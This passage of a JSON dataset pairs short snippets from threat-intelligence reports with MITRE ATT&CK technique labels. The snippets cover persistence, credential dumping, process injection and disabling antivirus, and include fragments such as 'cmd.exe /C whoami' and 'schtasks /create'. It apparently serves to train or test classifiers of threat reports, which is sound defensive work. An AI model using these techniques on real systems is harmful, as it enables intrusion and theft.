    "text": "collects OS information and the computer name from the victims machine.(Citation: Securelist Denis April 2017)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "checks if the victim OS is 32 or 64-bit.(Citation: FinFisher Citation)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can collect the username from the victim's machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "spawns a CMD process to execute commands. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can drop itself in `C:\\Windows\\System32\\spool\\prtprocs\\x64\\winprint.dll` as an alternative Print Processor to be loaded automatically when the spoolsv Windows service starts.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "VPN access using Single Factor authentication.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has searched for files on the infected host.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded second stage malware from compromised websites.(Citation: FireEye APT37 Feb 2018)(Citation: Securelist ScarCruft May 2019)(Citation: Volexity InkySquid BLUELIGHT August 2021)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has collected the host's OS CPU and memory information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "connects to port 80 of a C2 server using Wininet API. Data is exchanged via HTTP POSTs.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to uninstall itself by deleting its service and files.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "remote desktop protocol (RDP) and secure shell (SSH) accesses",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "has dumped credentials including by using .(Citation: Mandiant Operation Ke3chang November 2014)(Citation: NCC Group APT15 Alive and Strong)",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "can exfiltrate files from the victim machine.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "It was quite common to see scheduled tasks used to create persistence for the ransomware executable,",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can use Native API including CreateProcess GetProcessById and WriteProcessMemory.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Several hosts showed rundll32 processes exhibiting common process injection behavior",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to create files in a TEMP folder to act as a database to store information.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to create a reverse shell.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "establishes persistence through the creation of two keys in CurrentVersion\\Run.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has cleaned up all files associated with the secondary payload execution.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The most notable change to this variant of Zebrocy, other than the programming language used, is the way the tool gathers the system information and running processes",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "A  payload has searched all fixed drives on the victim for files matching a specified list of extensions.(Citation: Cymmetria Patchwork)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors used `cmd.exe` to execute the wmiexec.vbs script.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can fingerprint architecture computer name and OS version on the compromised host.  can also check if the Russian language is installed on the infected machine and terminate if it is found.(Citation: Cybereason Bazar July 2020)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "including the computer name and the OS version of the compromised system were sent",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can download additional plugins updates and other files. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to obtain a victim's system name and operating system version.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "This lures users to double-click the graphic to view the content,",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has gathered system information using systeminfo.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "directories with random names of a consistent length were navigated to by the same user that ran the tool.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "uses wmic to obtain the",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "can upload and download files to and from compromised hosts.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The actors used Mimikatz",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "collected information about the infected host including the machine names and OS architecture.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can collect operating system (OS) version information processor information system name and information about installed disks from the victim.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "crawl the filesystem",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "this shellcode is responsible for fetching Remcos RAT",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to gather information about the compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "used scheduled tasks for persistence.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "has saved files prior to upload from a compromised host to folders beginning with the characters `a9850d2f`.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "creates a scheduled task to maintain persistence on the victims machine.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "During  threat actors used HTTP for C2.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can delete itself from the compromised computer.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can download files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "“RClone” was downloaded on the file servers",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has collected the domain name of the victim system.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "created a directory named out in the user's %AppData% folder and copied files to it.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "has used rundll32.exe to load a DLL for file encryption.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "In order to establish persistence on the targeted host, the malware starts by saving a copy of itself in a new folder in the %APPDATA% directory",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can be used to copy files to/from a remotely connected external system.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can search for and collect data from specific Chrome Opera Microsoft Edge and Firefox files including any folders that have the string `Profile` in its name.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "collects the victim username and sends it to the C2 server.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "is capable of running WMI queries.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "finds the relevant syscall numbers for NT APIs,",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "This remote process listing",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Downloaded VBScript and PowerShell",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to collect or extract various types of system information from a targeted or compromised computer",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can inject into running processes on a compromised host.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "to trigger the retrieval of the final stage payload",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "uses rundll32.exe to load its DLL.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "exfiltrate data from messaging applications such as WhatsApp and Viber",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "uses the whoami command. ",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Command_Down_exec: This command downloads and executes new modules. It takes a url as the argument and uses that to download and execute files",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has required user execution of a malicious MSI installer.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "it then checks the amount of IPs found in the ARP table",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has used RDP sessions from public-facing systems to internal servers.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "After compromising a victim  lists all running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has collected data from local victim systems.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "malware is designed to steal sensitive information from victims' systems,",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has attempted to get users to click on a malicious zipped file. ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "installs itself as a service to maintain persistence.(Citation: Kroll RawPOS Jan 2017)(Citation: TrendMicro RawPOS April 2015)",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "used to create scheduled tasks for persistence",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "During  threat actors used administrative utilities to deliver Trojan components to remote systems.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate the current process on a compromised host.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has used valid SSH credentials to access remote hosts.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has used POST requests and HTTPS for C2 communications.(Citation: Kaspersky Dridex May 2017)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "performs the following actions to alter Windows Defender settings",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "uses HTTPS to communicate with Google Drive.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "It installs itself by creating an InstallSvc service",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "The backdoor has the capability to download and upload files, execute shell commands, and update its configuration.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to upload a file from the command and control (C2) server to the victim machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can utilize built-in modules to modify service binaries and restore them to their original state.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "is injected into a shared SVCHOST process. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can search read write move and execute files.(Citation: US-CERT BLINDINGCAN Aug 2020)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate host system information like OS architecture domain name applied patches and more.(Citation: Github PowerShell Empire)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "then deletes the file.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "usually to the victim’s domain name",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "may gather a list of running processes by running tasklist /v.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can establish persistence by adding a Registry run key.(Citation: Trend Micro DRBControl February 2020)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can collect the username on a targeted system.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "DISABLING ANTIVIRUS/MALWARE SOFTWARE USING \".BAT\" FILES",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "cmd.exe /C whoami",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "did RDP to a few other servers",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Inspecting the class C network for 185.162.235.0/24 shows us that another IP on the same network resolves to an OilRig domain, msoffice-cdn[.]com which we identified in August 2017",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "The exclusion rule allowlisted the entire , enabling threat actors to download tools to the  without virus scans.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "a malicious template file is downloaded and executed",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has exfiltrated files and directories of interest from the targeted system.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "the second option is used with the PID of explorer.exe to load the ComRAT payload reflectively into the process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "uses PowerShell to pull and run",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "will inject itself into different processes to evade detection. The selection of the target process is influenced by the security software that is installed on the system (Duqu will inject into different processes depending on which security suite is installed on the infected host).",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors used  for discovery on remote systems.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has used malware to disable Windows Defender.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "can be used to download files from a given URL.(Citation: TechNet Certutil)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has installed a service pointing to a malicious DLL dropped to disk.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "in an effort to evade any detection and prevention mechanisms, they disabled Windows Defender",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors also moved laterally to the domain controller, compromised credentials,",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has been used to run the tasklist command on a compromised system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to check whether the infected systems OS is Debian or RHEL/CentOS to determine which cryptocurrency miner it should use.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has deleted itself from the system after execution.(Citation: Medium Metamorfo Apr 2020)",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has used .cmd scripts on the victim's system. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can delete log files generated from the malware stored at C:\\windows\\temp\\tmp0207.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can identify logged in users across the domain and views user sessions.(Citation: Github Koadic)",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can extract subnet information from Active Directory.(Citation: Red Canary Hospital Thwarted Ryuk October 2020)(Citation: FireEye FIN6 Apr 2019)",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "the actors leveraged RDP to propagate to several hosts within the network.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "execute an IcedID loader with rundll32",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "the communication is consistent with HTTP/S traffic.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The purpose is to download and execute an additional payload hosted on a compromised website: NavRAT",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": " has the ability to support C2 communications over HTTP/S.(Citation: Cybersecurity Advisory SVR TTP May 2021)(Citation: Bishop Fox Sliver Framework August 2019)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can use the command cmd.exe /c del to delete its artifacts from the system. ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The download is done directly from the NetWalker Tor site",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "staging a credential theft capability in the LSASS process itself by abusing native Windows capabilities",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "can use wmic to help propagate itself across a network.(Citation: Talos Nyetya June 2017)",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "launches a scheduled task.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "compromised server that prompts the victim to click",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has used local account credentials found during the intrusion for lateral movement and privilege escalation.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "This shellcode injects the final payload taken from the resource section into the original RegAsm.exe process",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to inject a downloaded DLL into a newly created rundll32.exe process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "injects itself into running instances of outlook.exe iexplore.exe or firefox.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can inject shellcode directly into Excel.exe or a specific process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has queried the Registry to identify victim information.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "can modify registry keys as part of setting a new pass-through authentication agent.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "A Word document delivering  prompts the user to enable macro execution.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "collects the system information including hostname and OS version and sends it to the C2 server.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can retrieve the IP address of a compromised host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "downloads its backdoor component from a C2 server and loads it directly into memory.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can remove its persistence and delete itself.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can identify drives on compromised hosts and retrieve the hostname via `gethostbyname`.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has executed commands using cmd.exe /c.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate the system drives and associated system name.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "the attackers would launch a lateral movement phase, using default Windows credentials",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "can obtain the username from the victim's machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has used scheduled tasks to stage its operation.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "has a function to download a file to the infected system. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used WMIC for discovery as well as to execute payloads for persistence and lateral movement.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster RATs)(Citation: ClearSky Lazarus Aug 2020)(Citation: Kaspersky ThreatNeedle Feb 2021)",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "and execute the file using CreateProcessA.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Also, this variant of OopsIE uses the output of the whoami command as the parameter within the URL when communicating with the C2 server, which differs from the previous OopsIE variant that used the hostname and username from the environment variables",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can set values in the Registry to help in execution. ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Mimikatz is a key player in dumping credentials but LockBit 2.0 has been occasionally seen utilizing MiniDump as well.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to search the compromised host for files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has used scheduled tasks to establish persistence for various malware it uses including downloaders known as HARDTACK and SHIPBREAD and .",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can use thread injection to inject shellcode into the process of security software.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "batch file",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "request access level of 0x0040 (64) to LSASS, as well indicating other credential access tools may have been in use by the threat actor.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "is capable of providing shell functionality to the attacker to execute commands.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "its shell open command.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has the capability to use rm -rf to remove folders and files from the victim's machine.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors used `wmiexec.vbs` to run remote commands.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "has used dir to search for programfiles and appdata.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can modify the victim's anti-virus.(Citation: DigiTrust NanoCore Jan 2017)",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "used WMI in several ways including for execution of commands via WMIEXEC as well as for persistence via .(Citation: FireEye APT41 Aug 2019)",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "has used cmd.exe to launch PowerShell.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "uses HTTP and HTTPS to communicate with the C2 server.(Citation: FireEye FELIXROOT July 2018)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has staged archived files in a temporary directory prior to exfiltration.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "What does the Poseidon Group do? What happens after a target machine is infected? Once the target’s machine is compromised, the attacker first enumerates all processes running in the system and all services",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "used HTTP to download payloads for CVE-2019-19781 and CVE-2020-10189 exploits. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to self delete.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors obtained files and data from the compromised network.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Threat actors executed this tool on patient 0 with low-level privileges multiple times",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "it also tries to delete the wp-sale.js file",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "schtasks /create /TN",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "has stolen domain credentials by dumping LSASS process memory with comsvcs.dll and from a Microsoft Active Directory Domain Controller using .(Citation: FireEye APT35 2018)",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Batch files create a new admin user",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "including adding of registry keys",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "used the command ipconfig to obtain information about network configurations.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "If the  client process does not have administrator privileges it will add a registry key to `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` for persistence.(Citation: GitHub QuasarRAT) ",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has run hostname and systeminfo on a victim.(Citation: Palo Alto OilRig May 2016)(Citation: Palo Alto OilRig Oct 2016)(Citation: FireEye APT34 July 2019)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can use Native API for execution and to retrieve active services.(Citation: Secureworks REvil September 2019)",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can execute the command code do_download to retrieve remote files from C2.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can use `cmd.exe` for execution on victim systems.(Citation: Palo Alto Gamaredon Feb 2017)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has used uname -m to collect the name and information about the infected system's kernel.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "information Add Security Package64.dll injects pc.dll into LSASS by deploying pc.dll as a Security Package",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "As we can see, the following information is present within this configuration:  Remote Command and Control (C2) server Remote port Sleep timer  Reaver continues to collect various information from the victim machine, including the following:  CPU speed Computer name Username IP Address Microsoft Windows version Physical and virtual memory information  The malware proceeds to communicate with the remote server via HTTP GET and POST requests",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "infoClient is reponsible for collecting OS info, submitting this info to its C&C servers (the servers are malicious in nature), and receiving additional C&C communication information",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has used Registry modifications as part of its installation routine.(Citation: TrendMicro BKDR_URSNIF.SM)",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "executes commands using a command-line interface and reverse shell. The group has used a modified version of pentesting script wmiexec.vbs to execute commands.(Citation: PWC Cloud Hopper April 2017)(Citation: PWC Cloud Hopper Technical Annex April 2017)(Citation: Github AD-Pentest-Script)  has used malicious macros embedded inside Office documents to execute files.(Citation: Accenture Hogfish April 2018)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "FBI has high confidence that HIDDEN COBRA actors are using the IP addresses for further network exploitation.This alert includes technical indicators related to specific North Korean government cyber operations and provides suggested response actions to those indicators, recommended mitigation techniques, and information on reporting incidents to the U.S",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can use HTTP for C2 communication.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Those files will still get executed, if the user clicks on run",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "can query the Registry for keys added to execute COM hijacking.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "service is then created",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "can deliver additional payloads to victim machines.(Citation: Talos Cobalt Strike September 2020)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "creates a scheduled task on the system that provides persistence.(Citation: S2 Grupo TrickBot June 2017)(Citation: Trend Micro Totbrick Oct 2016)",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "collects OS version information such as registered owner details manufacturer details processor type available storage installed patches hostname version info system date and other system information by using the commands systeminfo net config workstation hostname ver set and date /t.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "service-based DLL implant traverses the FTP servers directories looking for files with keyword matches for computer names or certain keywords.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The  dropper uses Windows Management Instrumentation to extract information about the operating system and whether an anti-virus is active.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "has collected and exfiltrated payment card data from compromised systems.(Citation: Trend Micro FIN6 October 2019)(Citation: RiskIQ British Airways September 2018)",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "The WinAPI CryptGenRandom is utilized",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "collects information about available drives default browser desktop file list My Documents Internet history program files and root of available drives. It also searches for ICS-related software files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
